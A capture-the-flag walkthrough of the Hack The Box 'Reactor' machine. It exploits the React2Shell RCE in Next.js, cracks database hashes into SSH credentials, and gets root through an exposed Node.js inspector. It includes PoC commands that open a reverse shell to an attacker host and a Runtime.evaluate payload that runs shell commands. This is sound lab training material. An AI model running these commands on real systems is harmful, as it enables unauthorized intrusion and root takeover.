# Reactor | Hack-The-Box | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [HTB Reactor](https://app.hackthebox.com/machines/Reactor?sort_by=created_at&sort_type=desc)          |
| Difficulty        | Medium                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             | nmap, crackstation, react2shell, wscat.  |

# Reconnaissance

Nmap Scan 
```
nmap -A -T4 <ip address>
```
Initial scan reveals two open ports
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 3000/tcp    | http(Next.js application)          |


# Enumeration

Check out the webpage `http://target-IP:3000/` a static page “ReactorWatch Core Monitoring System” presumably used for monitoring industrial reactor metrics.<br>
After parsing the source code, The Following Technology Stack was identified 
- Framework: next.js 
- React Server Components (RSC) enabled and actively interacting with the server

Directory enumeration, fuzzing, and sub-domain enumeration did not yield anything useful.<br
>
Since we have already established that the webpage does server actions. Let’s search for exploits under Next.js 

## Foothold
Vulnerability: CVE-2025–55182 (React2Shell):<br>
The React2Shell vulnerability (CVE-2025–55182) is a critical pre-authentication Remote Code Execution (RCE) flaw affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, it allows attackers to execute arbitrary code on a vulnerable server via a single malicious HTTP request, without authentication.<br>
The flaw stems from improper validation of serialized payloads in the Flight protocol used by React Server Components. Malicious payloads can trigger prototype pollution and lead to Node.js code execution. This impacts both Linux and Windows environments, including containerized deployments.<br>

# Exploitation
For this Machine, let’s use an automated exploitation using Reach2Shell<br>
Steps to follow: <br>
- CVE-2025–55182: React2Shell — Unauthenticated RCE in React Server Components | p3ta@dc710
```
#check vulnerability
 python3 react2shell-poc.py -t http://Target-IP:3000 --check

#check command execution
python3 react2shell-poc.py -t http://Target-IP:3000 -c "id" --listen --lhost Attacker-IP

# Set up a reverse shell
python3 react2shell-poc.py -t http://Target-IP:3000 --revshell --lhost Attacker-IP --lport 4444
```

After gaining access as the node user, we searched the system for interesting files and discovered a `SQLite3 database`.<br>
Open the .db file, and we get username and password hashes
crack the hashes using `CRACKSTATION`

Finally we get<br>
- username: engineer
- password: reactor1 

# Initial Access
Log in via SSH using the cracked credentials 
```
ssh engineer@Target-IP
```
<b>The user flag can be found in <br>`/home/engineer/user.txt`</b>

# Privilege Escalation

A review of active processes identified a Node.js service running as root with the inspector interface enabled
```
root /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
This means:
- Node is running as root
- The Node debugger (Inspector) is enabled
- The debugger listens on port 9229

The Inspector is normally used by developers to debug applications.<br>

The Node.js inspector was listening only on `127.0.0.1:9229`, meaning it was not directly accessible from external hosts. Normally, interaction with the inspector would be performed using `wscat`, a command-line `WebSocket client`. However, due to DNS issues on the target system, installing wscat was not feasible. As a workaround, we leveraged an alternative method to communicate with the inspector and proceed with exploitation.
```
-> First up, we create an SSH tunnel 
# Attacker terminal
ssh -L 9229:127.0.0.1:9229 engineer@Target-IP
```
```
-> Obtain the Websocket endpoint 
# Target Terminal
curl http://127.0.0.1:9229/json
```
```
#You will get something similar to this
[
  {
    "id":"7f8f8f4a-3c65-4c55-b9a7-f7f7e8a9a123",
    "title":"worker.js",
    "webSocketDebuggerUrl":"ws://127.0.0.1:9229/7f8f8f4a-3c65-4c55-b9a7-f7f7e8a9a123"
  }
]
We need “ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123”
```
```
-> Connect to inspector 
# Attacker Terminal
npm install -g wscat
```
```
# Attacker Terminal
wscat -c ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123
```
```
# execute the command below 
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
    "returnByValue": true
  }
}
```

Make sure you write the command in a single line 
```
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```

<b>The Output is the root flag!! </b><br>
Since our objective was just the root flag, we only executed to get that. <br>
If needed, we can also go ahead and generate a reverse shell from root and cause more damage 

Root flag & User Flag found!<br>
Hope this Walkthrough was fun, easy to follow and helpful to you.<br>
Happy Hacking ~!!!